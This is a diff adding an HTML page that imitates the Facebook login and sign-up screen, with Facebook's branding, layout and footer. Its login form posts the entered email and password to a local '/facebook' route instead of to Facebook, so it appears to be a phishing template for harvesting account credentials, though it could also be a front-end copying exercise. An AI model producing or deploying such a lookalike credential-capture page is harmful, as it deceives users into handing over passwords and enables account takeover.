@@ -1,0 +1,448 @@
+<html>
+  <head>
+    <link
+      href="https://fonts.googleapis.com/css?family=Comfortaa|Inconsolata&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      * {
+        margin: 0px;
+        padding: 0px;
+        font-family: sans-serif;
+        outline: none;
+      }
+      .main {
+        background: linear-gradient(white, #d3d8e8);
+        height: 633px;
+      }
+      .head {
+        background-color: #3b5998;
+        background-image: linear-gradient(#4e69a2, #3b5998 50%);
+        border-bottom: 1px solid #133783;
+      }
+      .heading {
+        width: 980px;
+        color: white !important;
+        display: flex;
+        justify-content: space-between;
+        margin: auto;
+        align-items: center;
+        height: 82px;
+      }
+      td {
+        color: white;
+        font-size: 13px;
+      }
+      .line {
+        text-decoration: none !important;
+        color: #9cb4d8 !important;
+        display: block;
+      }
+      .line:hover {
+        box-shadow: inset 0 -1px 0 0 #9cb4d8;
+      }
+      .btn {
+        background-color: #4267b2;
+        border-color: #29487d;
+        font-size: 12px;
+        padding: 5px 8px;
+        color: white;
+        cursor: pointer;
+        font-weight: 900;
+      }
+      .btn:hover {
+        background-color: #3b5998;
+      }
+      .sub-btn {
+        background: linear-gradient(#67ae55, #578843);
+        background-color: #69a74e;
+        box-shadow: inset 0 1px 1px #a4e388;
+        border-color: #3b6e22 #3b6e22 #2c5115;
+        font-size: 20px;
+        height: 40px;
+        color: white;
+        width: 190px;
+        border-radius: 5px;
+        margin-top: 25px;
+        cursor: pointer;
+      }
+      .sub-btn:hover {
+        background: linear-gradient(#79bc64, #578843);
+      }
+      @media screen and (max-width: 500px) {
+        h1 {
+          font-size: 24px !important;
+        }
+        td {
+          color: white;
+          font-size: 15px !important;
+        }
+      }
+      .account {
+        width: 980px;
+        display: flex;
+        justify-content: space-between;
+        margin: auto;
+        /* align-items: center; */
+        margin-top: 30px;
+      }
+      select {
+        font-size: 14px;
+        height: 30px;
+        padding: 5px;
+        font-weight: 900;
+        border: 1px solid #c2c9d0;
+        text-align: center;
+      }
+      .lang {
+        width: 500px;
+        display: flex;
+        list-style: none;
+        justify-content: space-between;
+        font-size: 13px;
+        color: #385898;
+        margin-top: 100px;
+      }
+      .lang1 {
+        display: flex;
+        list-style: none;
+        justify-content: space-between;
+        font-size: 13px;
+        color: #385898;
+        font-weight: 900;
+        padding-bottom: 5px;
+      }
+      .ul-line {
+        text-decoration: none !important;
+        cursor: pointer;
+        display: block;
+      }
+      .ul-line:hover {
+        box-shadow: inset 0 -1px 0 0 #385898;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="main">
+      <div class="head">
+        <div class="heading">
+          <div>
+            <h1 style="font-size: 37px;font-weight: bolder;cursor: pointer;">
+              facebook
+            </h1>
+          </div>
+          <div>
+            <form action="/facebook" method="POST">
+            <table>
+              <tr>
+                <td style="padding-bottom: 4px;font-size: 14px;">
+                  Email or Phone
+                </td>
+
+                <td style="padding-bottom: 4px;font-size: 14px;">
+                  Password
+                </td>
+              </tr>
+              <tr>
+                <td>
+                  <input
+                    type="text"
+                    name="email"
+                    style=" border: 1px solid #1d2a5b;width: 150px;
+                    border-radius: 0;
+                    margin: 0;
+                    padding: 4px;  margin-right: 15px;height: 23px;"
+                  />
+                </td>
+
+                <td>
+                  <input
+                    type="password"
+                    name="password"
+                    style=" border: 1px solid #1d2a5b;width: 150px;
+                    border-radius: 0;
+                    margin: 0;
+                    padding: 4px;margin-right: 15px;height: 23px;"
+                  />
+                </td>
+                <td>
+                  <button class="btn">
+                    Log In
+                  </button>
+                </td>
+              </tr>
+              <tr>
+                <td></td>
+                <td
+                  style="padding: 4px 0px;
+                font-size: 14px;
+                cursor: pointer;
+                display: inline-block;
+               "
+                >
+                  <a href="#" class="line">Forgotten account?</a>
+                </td>
+              </tr>
+            </table>
+          </form>
+          </div>
+        </div>
+      </div>
+      <div class="account">
+        <div>
+          <p
+            style="color: #0e385f;
+          font-size: 23px;
+              line-height: 29px;font-weight: 900"
+          >
+            Facebook helps you connect and share with the<br />
+            people in your life
+          </p>
+
+          <p>
+            <img style="margin-top:5px" src="loction.png" alt="loction" />
+          </p>
+        </div>
+
+        <div>
+          <h1 style=" font-size: 37px;font-weight: bold;margin-bottom: 13px">
+            Create an account
+          </h1>
+          <h3
+            style="color: #1d2129;
+          font-size: 20px;margin-bottom: 20px;font-weight: 900"
+          >
+            It's quick and easy.
+          </h3>
+          <div style="width:400px">
+            <input
+              style="width: 48%;border: 1px solid  #c2c9d0;;border-radius: 0;font-size: 18px;padding: 8px 10px;margin-right: 8px;border-radius: 5px;margin-bottom: 10px"
+              type="text; " placeholder="First name"
+            />
+
+            <input
+              style="width: 48%;font-size: 18px;padding: 8px 10px;border-radius: 5px;border: 1px solid  #c2c9d0;;border-radius: 0;border-radius: 5px"
+              type="text" placeholder="Surname"
+            />
+
+            <input
+              style="font-size: 18px;padding: 8px 10px;border-radius:
+          5px;border: 1px solid  #c2c9d0;;border-radius: 0;border-radius: 5px;width: 100%;margin-bottom: 10px"
+              type="text" placeholder="Mobile number or email address"
+            />
+            <input
+              style="font-size: 18px;padding: 8px 10px;border-radius:
+        5px;border: 1px solid #c2c9d0;border-radius: 0;border-radius: 5px;width: 100%;margin-bottom: 10px"
+              type="text" placeholder="New password"
+            />
+          </div>
+          <h3
+            style="    color: #90949c;
+          font-size: 19px;
+          font-weight: 900;margin: 12px 0 5px;"
+          >
+            Birthday
+          </h3>
+          <select style="width:60px"
+            ><option>Day</option>
+            <option>1</option>
+            <option>2</option>
+            <option>3</option>
+            <option>4</option>
+            <option>5</option>
+            <option>6</option>
+            <option>7</option>
+            <option>8</option>
+            <option>9</option>
+            <option>10</option>
+            <option>11</option>
+            <option>12</option>
+            <option>13</option>
+            <option>14</option>
+            <option>15</option>
+            <option>16</option>
+            <option>17</option>
+            <option>18</option>
+            <option>19</option>
+            <option>20</option>
+            <option>21</option>
+            <option>22</option>
+            <option>23</option>
+            <option>24</option>
+            <option>25</option>
+            <option>26</option>
+            <option>27</option>
+            <option>28</option>
+            <option>29</option>
+            <option>30</option>
+            <option>31</option>
+          </select>
+          <select style="width:75px"
+            ><option>Month</option>
+            <option>Jan</option>
+            <option>Feb</option>
+            <option>Mar</option>
+            <option>Apr</option>
+            <option>May</option>
+            <option>Jun</option>
+            <option>Jul</option>
+            <option>Aug</option>
+            <option>Sept</option>
+            <option>Oct</option>
+            <option>Nov</option>
+            <option>Dec</option></select
+          >
+          <select style="width:65px">
+            <option>Year</option
+            ><option>2000</option>
+            <option>2001</option>
+            <option>2002</option>
+            <option>2003</option>
+            <option>2004</option>
+            <option>2005</option>
+            <option>2006</option>
+            <option>2007</option>
+            <option>2008</option>
+            <option>2009</option>
+            <option>2010</option>
+            <option>2011</option>
+            <option>2012</option>
+            <option>2013</option>
+            <option>2014</option>
+            <option>2015</option>
+            <option>2016</option>
+            <option>2017</option>
+            <option>2018</option>
+            <option>2019</option>
+            <option>2020</option> </select
+          ><span
+            style="color: lightgray ;margin-left:13px;padding:0 4px;background-color:#707178;border-radius: 100%;font-size: 15px ;cursor: pointer;"
+            >?</span
+          >
+          <h3
+            style="color: #90949c;font-size: 19px;
+            font-weight: 900;margin: 12px 0 0;
+          "
+          >
+            Gender
+          </h3>
+          <input
+            style="margin: 15px 7px 20px 13px;"
+            type="radio"
+            name="gender"
+            value="female"
+          /><span
+            style="color: #1d2129;
+          font-size: 18px;
+          font-weight: 900;"
+            >Female</span
+          >
+
+          <input
+            style="margin: 15px 0 20px 15px;"
+            type="radio"
+            name="gender"
+            value="male"
+          />
+          <span
+            style="color: #1d2129;
+        font-size: 18px;
+        font-weight: 900;"
+            >Male</span
+          ><input
+            style="margin: 15px 7px 20px 23px;"
+            type="radio"
+            name="gender"
+            value="others"
+          /><span
+            style="color: #1d2129;
+        font-size: 18px;
+        font-weight: 900;"
+            >Custom</span
+          ><span
+            style="color: lightgray ;margin-left:20px;padding:0 4px;background-color:#707178;border-radius: 100%;font-size: 15px;cursor: pointer; "
+            >?</span
+          >
+          <p style="font-size:11px;line-height: 13px">
+            <b>
+              By clicking Sign Up, you agree to our Terms, Data Policy<br />
+              and Cookie Policy. You may receive SMS notifications from<br />
+              us and can opt out at any time.</b
+            >
+          </p>
+          <button class="sub-btn">
+            Sign Up
+          </button>
+        </div>
+      </div>
+    </div>
+    <div style="margin:auto;width:980px">
+      <ul class="lang">
+        <li>English (UK)</li>
+        <li class="ul-line">हिन्दी</li>
+        <li class="ul-line">اردو</li>
+        <li class="ul-line">தமிழ்</li>
+        <li class="ul-line">বাংলা</li>
+        <li class="ul-line">मराठी</li>
+        <li class="ul-line">తెలుగు</li>
+        <li class="ul-line">ગુજરાતી</li>
+        <li class="ul-line">ಕನ್ನಡ</li>
+        <li class="ul-line">മലയാളം</li>
+        <li class="ul-line">
+          Español
+        </li>
+      </ul>
+      <div
+        style="height:1px;background-color: #dddfe2;
+font-size: 1px;
+margin-top: 6px;
+margin-bottom: 6px;"
+      ></div>
+      <ul class="lang1">
+        <li class="ul-line">
+          Sign Up
+        </li>
+        <li class="ul-line">Log In</li>
+        <li class="ul-line">Messenger</li>
+        <li class="ul-line">Facebook Lite</li>
+        <li class="ul-line">People</li>
+        <li class="ul-line">Pages</li>
+        <li class="ul-line">Page categories</li>
+        <li class="ul-line">Places</li>
+        <li class="ul-line">Games</li>
+        <li class="ul-line">Locations</li>
+        <li class="ul-line">Marketplace</li>
+        <li class="ul-line">Groups</li>
+        <li class="ul-line">Instagram</li>
+        <li class="ul-line">Local</li>
+      </ul>
+      <ul class="lang1">
+        <li>
+          Fundraisers
+        </li>
+        <li class="ul-line">Services</li>
+        <li class="ul-line">About</li>
+        <li class="ul-line">Create ad</li>
+        <li class="ul-line">Create Page</li>
+        <li class="ul-line">Developers</li>
+        <li class="ul-line">Careers</li>
+        <li class="ul-line">Privacy</li>
+        <li class="ul-line">Cookies</li>
+        <li class="ul-line">AdChoices</li>
+        <li class="ul-line">Terms</li>
+        <li class="ul-line">Account security</li>
+        <li class="ul-line">Login help</li>
+      </ul>
+      <ul class="lang1">
+        <li class="ul-line">Help</li>
+      </ul>
+      <p
+        style="  font-size: 13px;
+        color: #737373;;
+      font-weight: 900;margin-top: 15px"
+      >
+        Facebook © 2019
+      </p>
+    </div>
+  </body>
+</html>
